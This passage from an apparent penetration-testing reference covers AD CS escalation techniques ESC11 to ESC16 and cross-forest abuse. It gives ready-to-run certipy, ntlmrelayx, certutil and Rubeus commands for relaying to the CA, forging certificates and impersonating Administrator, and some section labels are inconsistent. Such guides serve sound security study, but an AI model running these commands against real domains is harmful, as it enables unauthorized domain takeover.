$ certipy relay -target 'rpc://DC01.domain.local' -ca 'DC01-CA' -dc-ip 192.168.100.100
Certipy v4.7.0 - by Oliver Lyak (ly4k)

[*] Targeting rpc://DC01.domain.local (ESC11)
[*] Listening on 0.0.0.0:445
[*] Connecting to ncacn_ip_tcp:DC01.domain.local[135] to determine ICPR stringbinding
[*] Attacking user 'Administrator@DOMAIN'
[*] Template was not defined. Defaulting to Machine/User
[*] Requesting certificate for user 'Administrator' with template 'User'
[*] Requesting certificate via RPC
[*] Successfully requested certificate
[*] Request ID is 10
[*] Got certificate with UPN 'Administrator@domain.local'
[*] Certificate object SID is 'S-1-5-21-1597581903-3066826612-568686062-500'
[*] Saved certificate and private key to 'administrator.pfx'
[*] Exiting...
```

Note: For domain controllers, we must specify `-template` in DomainController.

Or using [sploutchy's fork of impacket](https://github.com/sploutchy/impacket) :

```bash
$ ntlmrelayx.py -t rpc://192.168.100.100 -rpc-mode ICPR -icpr-ca-name DC01-CA -smb2support
```

## Shell access to ADCS CA with YubiHSM - ESC12

### Explanation

Administrators can set up the Certificate Authority to store it on an external device like the "Yubico YubiHSM2".

If USB device connected to the CA server via a USB port, or a USB device server in case of the CA server is a virtual machine, an authentication key (sometimes referred to as a "password") is required for the Key Storage Provider to generate and utilize keys in the YubiHSM.

This key/password is stored in the registry under `HKEY_LOCAL_MACHINE\SOFTWARE\Yubico\YubiHSM\AuthKeysetPassword` in cleartext.

Reference in [here](https://pkiblog.knobloch.info/esc12-shell-access-to-adcs-ca-with-yubihsm).

### Abuse Scenario

If the CA's private key stored on a physical USB device when you got a shell access, it is possible to recover the key.

In first, you need to obtain the CA certificate (this is public) and then:

```cmd
# import it to the user store with CA certificate
$ certutil -addstore -user my <CA certificate file>

# Associated with the private key in the YubiHSM2 device
$ certutil -csp "YubiHSM Key Storage Provider" -repairstore -user my <CA Common Name>
```

Finally, use the certutil `-sign` command to forge a new arbitrary certificate using the CA certificate and its private key.

## OID Group Link Abuse - ESC13

### Explanation

The `msPKI-Certificate-Policy` attribute allows the issuance policy to be added to the certificate template. The `msPKI-Enterprise-Oid` objects that are responsible for issuing policies can be discovered in the Configuration Naming Context (CN=OID,CN=Public Key Services,CN=Services) of the PKI OID container. A policy can be linked to an AD group using this object's `msDS-OIDToGroupLink` attribute, enabling a system to authorize a user who presents the certificate as though he were a member of the group. [Reference in here](https://posts.specterops.io/adcs-esc13-abuse-technique-fda4272fbd53).

In other words, when a user has permission to enroll a certificate and the certificate is link to an OID group, the user can inherit the privileges of this group.

Use [Check-ADCSESC13.ps1](https://github.com/JonasBK/Powershell/blob/master/Check-ADCSESC13.ps1) to find OIDToGroupLink:

```bash
Enumerating OIDs
------------------------
OID 23541150.FCB720D24BC82FBD1A33CB406A14094D links to group: CN=VulnerableGroup,CN=Users,DC=domain,DC=local

OID DisplayName: 1.3.6.1.4.1.311.21.8.3025710.4393146.2181807.13924342.9568199.8.4253412.23541150
OID DistinguishedName: CN=23541150.FCB720D24BC82FBD1A33CB406A14094D,CN=OID,CN=Public Key Services,CN=Services,CN=Configuration,DC=domain,DC=local
OID msPKI-Cert-Template-OID: 1.3.6.1.4.1.311.21.8.3025710.4393146.2181807.13924342.9568199.8.4253412.23541150
OID msDS-OIDToGroupLink: CN=VulnerableGroup,CN=Users,DC=domain,DC=local
------------------------
Enumerating certificate templates
------------------------
Certificate template VulnerableTemplate may be used to obtain membership of CN=VulnerableGroup,CN=Users,DC=domain,DC=local

Certificate template Name: VulnerableTemplate
OID DisplayName: 1.3.6.1.4.1.311.21.8.3025710.4393146.2181807.13924342.9568199.8.4253412.23541150
OID DistinguishedName: CN=23541150.FCB720D24BC82FBD1A33CB406A14094D,CN=OID,CN=Public Key Services,CN=Services,CN=Configuration,DC=domain,DC=local
OID msPKI-Cert-Template-OID: 1.3.6.1.4.1.311.21.8.3025710.4393146.2181807.13924342.9568199.8.4253412.23541150
OID msDS-OIDToGroupLink: CN=VulnerableGroup,CN=Users,DC=domain,DC=local
------------------------
```

### Abuse Scenario

Find a user permission it can use `certipy find` or `Certify.exe find /showAllPermissions`.

If `John` have have permission to enroll `VulnerableTemplate`, the user can inherit the privileges of `VulnerableGroup` group.

All it need to do just specify the template, it will get a certificate with OIDToGroupLink rights.

```bash
certipy req -u "John@domain.local" -p "password" -dc-ip 192.168.100.100 -target "DC01.domain.local" -ca 'DC01-CA' -template 'VulnerableTemplate'
```

## Vulnerable Certificate Renewal Configuration- ESC14

### Explanation

The description at https://github.com/ly4k/Certipy/wiki/06-%E2%80%90-Privilege-Escalation#esc14-weak-explicit-certificate-mapping is remarkably thorough. Below is a quotation of the original text.

ESC14 addresses vulnerabilities arising from "weak explicit certificate mapping", primarily through the misuse or insecure configuration of the `altSecurityIdentities` attribute on Active Directory user or computer accounts. This multi-valued attribute allows administrators to manually associate X.509 certificates with an AD account for authentication purposes. When populated, these explicit mappings can override the default certificate mapping logic, which typically relies on UPNs or DNS names in the SAN of the certificate, or the SID embedded in the `szOID_NTDS_CA_SECURITY_EXT` security extension.

A "weak" mapping occurs when the string value used within the `altSecurityIdentities` attribute to identify a certificate is too broad, easily guessable, relies on non-unique certificate fields, or uses easily spoofable certificate components. If an attacker can obtain or craft a certificate whose attributes match such a weakly defined explicit mapping for a privileged account, they can use that certificate to authenticate as and impersonate that account.

Examples of potentially weak `altSecurityIdentities` mapping strings include:

- Mapping solely by a common Subject Common Name (CN): e.g., `X509:<S>CN=SomeUser`. An attacker might be able to obtain a certificate with this CN from a less secure source.
- Using overly generic Issuer Distinguished Names (DNs) or Subject DNs without further qualification like a specific serial number or subject key identifier: e.g., `X509:<I>CN=SomeInternalCA<S>CN=GenericUser`.
- Employing other predictable patterns or non-cryptographic identifiers that an attacker might be able to satisfy in a certificate they can legitimately obtain or forge (if they have compromised a CA or found a vulnerable template like in ESC1).

The `altSecurityIdentities` attribute supports various formats for mapping, such as:

- `X509:<I>IssuerDN<S>SubjectDN` (maps by full Issuer and Subject DN)
- `X509:<SKI>SubjectKeyIdentifier` (maps by the certificate's Subject Key Identifier extension value)
- `X509:<SR>SerialNumberBackedByIssuerDN` (maps by serial number, implicitly qualified by the Issuer DN) - this is not a standard format, usually it's `<I>IssuerDN<SR>SerialNumber`.
- `X509:<RFC822>EmailAddress` (maps by an RFC822 name, typically an email address, from the SAN)
- `X509:<SHA1-PUKEY>Thumbprint-of-Raw-PublicKey` (maps by a SHA1 hash of the certificate's raw public key - generally strong)

The security of these mappings depends heavily on the specificity, uniqueness, and cryptographic strength of the chosen certificate identifiers used in the mapping string. Even with strong certificate binding modes enabled on Domain Controllers (which primarily affect implicit mappings based on SAN UPNs/DNS and the SID extension), a poorly configured `altSecurityIdentities` entry can still present a direct path for impersonation if the mapping logic itself is flawed or too permissive.
### Abuse Scenario

ESC14 targets **explicit certificate mappings** in Active Directory (AD), specifically the `altSecurityIdentities` attribute. If this attribute is set (by design or misconfiguration), attackers can impersonate accounts by presenting certificates that match the mapping.

#### Scenario A: Attacker Can Write to `altSecurityIdentities`

 **Precondition**: Attacker has write permissions to the target account’s `altSecurityIdentities` attribute or the permission to grant it in the form of one of the following permissions on the target AD object:  
- Write property `altSecurityIdentities`  
- Write property `Public-Information`  
- Write property (all)  
- `WriteDACL`  
- `WriteOwner`*  
- `GenericWrite`  
- `GenericAll`  
- Owner*.
#### Scenario B: Target Has Weak Mapping via X509RFC822 (Email)

- **Precondition**: The target has a weak X509RFC822 mapping in altSecurityIdentities. An attacker can set the victim's mail attribute to match the target's X509RFC822 name, enroll a certificate as the victim, and use it to authenticate as the target.
#### Scenario C: Target Has X509IssuerSubject Mapping

- **Precondition**: The target has a weak X509IssuerSubject explicit mapping in `altSecurityIdentities`.The attacker can set the `cn` or `dNSHostName` attribute on a victim principal to match the subject of the target’s X509IssuerSubject mapping. Then, the attacker can enroll a certificate as the victim, and use this certificate to authenticate as the target.
#### Scenario D: Target Has X509SubjectOnly Mapping

- **Precondition**: The target has a weak X509SubjectOnly explicit mapping in `altSecurityIdentities`. The attacker can set the `cn` or `dNSHostName` attribute on a victim principal to match the subject of the target’s X509SubjectOnly mapping. Then, the attacker can enroll a certificate as the victim, and use this certificate to authenticate as the target.
### concrete operations
#### Scenario A

Request a certificate of the certificate template `Machine`

```bash
.\Certify.exe request /ca:<ca> /template:Machine /machine
```

 Save and convert the certificate

```bash
certutil -MergePFX .\esc13.pem .\esc13.pfx
```

 Authenticate (using the certificate)

```bash
.\Rubeus.exe asktgt /user:<user> /certificate:C:\esc13.pfx /nowrap
```

Cleanup (optional)

```bash
Remove-AltSecIDMapping -DistinguishedName "CN=TargetUserA,CN=Users,DC=external,DC=local" -MappingString "X509:<I>DC=local,DC=external,CN=external-EXTCA01-CA<SR>250000000000a5e838c6db04f959250000006c"
```

For more specific attack methods in various attack scenarios, please refer to the following: [adcs-esc14-abuse-technique](https://posts.specterops.io/adcs-esc14-abuse-technique-333a004dc2b9#aca0).

## EKUwu Application Policies(CVE-2024-49019) - ESC15

### Explanation

The description at https://trustedsec.com/blog/ekuwu-not-just-another-ad-cs-esc is remarkably thorough. Below is a quotation of the original text.

Using built-in default version 1 certificate templates, an attacker can craft a CSR to include application policies that are preferred over the configured Extended Key Usage attributes specified in the template. The only requirement is enrollment rights, and it can be used to generate client authentication, certificate request agent, and codesigning certificates using the **_WebServer_** template

### Abuse

The following is referenced to [this link]((https://github.com/ly4k/Certipy/wiki/06-%E2%80%90-Privilege-Escalation#esc15-arbitrary-application-policy-injection-in-v1-templates-cve-2024-49019-ekuwu),Click to see more detailed usage methods.


Certipy's `find` command can help identify V1 templates that are potentially susceptible to ESC15 if the CA is unpatched.

```bash
certipy find -username cccc@aaa.htb -password aaaaaa -dc-ip 10.0.0.100
```

#### Scenario A: Direct Impersonation via Schannel

**Step 1: Request a certificate, injecting "Client Authentication" Application Policy and target UPN.** Attacker `attacker@corp.local` targets `administrator@corp.local` using the "WebServer" V1 template (which allows enrollee-supplied subject).

```bash
certipy req \
    -u 'attacker@corp.local' -p 'Passw0rd!' \
    -dc-ip '10.0.0.100' -target 'CA.CORP.LOCAL' \
    -ca 'CORP-CA' -template 'WebServer' \
    -upn 'administrator@corp.local' -sid 'S-1-5-21-...-500' \
    -application-policies 'Client Authentication'
```

- `-template 'WebServer'`: The vulnerable V1 template with "Enrollee supplies subject".
- `-application-policies 'Client Authentication'`: Injects the OID `1.3.6.1.5.5.7.3.2` into the Application Policies extension of the CSR.
- `-upn 'administrator@corp.local'`: Sets the UPN in the SAN for impersonation.

**Step 2: Authenticate via Schannel (LDAPS) using the obtained certificate.**

```bash
certipy auth -pfx 'administrator.pfx' -dc-ip '10.0.0.100' -ldap-shell
```

#### Scenario B: PKINIT/Kerberos Impersonation via Enrollment Agent Abuse

**Step 1: Request a certificate from a V1 template (with "Enrollee supplies subject"), injecting "Certificate Request Agent" Application Policy.** This certificate is for the attacker (`attacker@corp.local`) to become an enrollment agent. No UPN is specified for the attacker's own identity here, as the goal is the agent capability.

```bash
certipy req \
    -u 'attacker@corp.local' -p 'Passw0rd!' \
    -dc-ip '10.0.0.100' -target 'CA.CORP.LOCAL' \
    -ca 'CORP-CA' -template 'WebServer' \
    -application-policies 'Certificate Request Agent'
```

- `-application-policies 'Certificate Request Agent'`: Injects OID `1.3.6.1.4.1.311.20.2.1`.

**Step 2: Use the "agent" certificate to request a certificate on behalf of a target privileged user.** This is an ESC3-like step, using the certificate from Step 1 as the agent certificate.

```bash
certipy req \
    -u 'attacker@corp.local' -p 'Passw0rd!' \
    -dc-ip '10.0.0.100' -target 'CA.CORP.LOCAL' \
    -ca 'CORP-CA' -template 'User' \
    -pfx 'attacker.pfx' -on-behalf-of 'CORP\Administrator'
```

**Step 3: Authenticate as the privileged user using the "on-behalf-of" certificate.**

```bash
certipy auth -pfx 'administrator.pfx' -dc-ip '10.0.0.100'
```

## Security Extension Disabled on CA (Globally)-ESC16

### Explanation

**ESC16 (Elevation of Privilege via Missing szOID_NTDS_CA_SECURITY_EXT Extension)** refers to the scenario where, if the configuration of AD CS does not enforce the inclusion of the **szOID_NTDS_CA_SECURITY_EXT** extension in all certificates, an attacker can exploit this by:

1. Requesting a certificate **without SID binding**.
    
2. Using this certificate **for authentication as any account**, such as impersonating a high-privilege account (e.g., a Domain Administrator).

You can also refer to this article to learn more about the detailed principle:https://medium.com/@muneebnawaz3849/ad-cs-esc16-misconfiguration-and-exploitation-9264e022a8c6

### Abuse

The following is referenced to [this link](https://github.com/ly4k/Certipy/wiki/06-%E2%80%90-Privilege-Escalation#esc16-security-extension-disabled-on-ca-globally),Click to see more detailed usage methods.

To identify whether the Active Directory Certificate Services (AD CS) environment is vulnerable to **ESC16**

```bash
certipy find -u 'attacker@corp.local' -p '' -dc-ip 10.0.0.100 -stdout -vulnerable
```

**Step 1: Read initial UPN of the victim account (Optional - for restoration).  


```bash
certipy account \
    -u 'attacker@corp.local' -p 'Passw0rd!' \
    -dc-ip '10.0.0.100' -user 'victim' \
    read
```

**Step 2: Update the victim account's UPN to the target administrator's `sAMAccountName`.  

```bash
certipy account \
    -u 'attacker@corp.local' -p 'Passw0rd!' \
    -dc-ip '10.0.0.100' -upn 'administrator' \
    -user 'victim' update
```

**Step 3: (If needed) Obtain credentials for the "victim" account (e.g., via Shadow Credentials).**

```shell
certipy shadow \
    -u 'attacker@corp.local' -p 'Passw0rd!' \
    -dc-ip '10.0.0.100' -account 'victim' \
    auto
```

**Step 4: Request a certificate as the "victim" user from _any suitable client authentication template_ (e.g., "User") on the ESC16-vulnerable CA.** Because the CA is vulnerable to ESC16, it will automatically omit the SID security extension from the issued certificate, regardless of the template's specific settings for this extension. Set the Kerberos credential cache environment variable (shell command):

```bash
export KRB5CCNAME=victim.ccache
```

Then request the certificate:

```bash
certipy req \
    -k -dc-ip '10.0.0.100' \
    -target 'CA.CORP.LOCAL' -ca 'CORP-CA' \
    -template 'User'
```

**Step 5: Revert the "victim" account's UPN.**

```bash
certipy account \
    -u 'attacker@corp.local' -p 'Passw0rd!' \
    -dc-ip '10.0.0.100' -upn 'victim@corp.local' \
    -user 'victim' update
```

**Step 6: Authenticate as the target administrator.**

```bash
certipy auth \
    -dc-ip '10.0.0.100' -pfx 'administrator.pfx' \
    -username 'administrator' -domain 'corp.local'
```
## Compromising Forests with Certificates Explained in Passive Voice

### Breaking of Forest Trusts by Compromised CAs

The configuration for **cross-forest enrollment** is made relatively straightforward. The **root CA certificate** from the resource forest is **published to the account forests** by administrators, and the **enterprise CA** certificates from the resource forest are **added to the `NTAuthCertificates` and AIA containers in each account forest**. To clarify, this arrangement grants the **CA in the resource forest complete control** over all other forests for which it manages PKI. Should this CA be **compromised by attackers**, certificates for all users in both the resource and account forests could be **forged by them**, thereby breaking the security boundary of the forest.

### Enrollment Privileges Granted to Foreign Principals

In multi-forest environments, caution is required concerning Enterprise CAs that **publish certificate templates** which allow **Authenticated Users or foreign principals** (users/groups external to the forest to which the Enterprise CA belongs) **enrollment and edit rights**.\
Upon authentication across a trust, the **Authenticated Users SID** is added to the user’s token by AD. Thus, if a domain possesses an Enterprise CA with a template that **allows Authenticated Users enrollment rights**, a template could potentially be **enrolled in by a user from a different forest**. Likewise, if **enrollment rights are explicitly granted to a foreign principal by a template**, a **cross-forest access-control relationship is thereby created**, enabling a principal from one forest to **enroll in a template from another forest**.

Both scenarios lead to an **increase in the attack surface** from one forest to another. The settings of the certificate template could be exploited by an attacker to obtain additional privileges in a foreign domain.


## References

- [Certify 2.0 – SpecterOps Blog](https://specterops.io/blog/2025/08/11/certify-2-0/)

{{#include ../../../banners/hacktricks-training.md}}



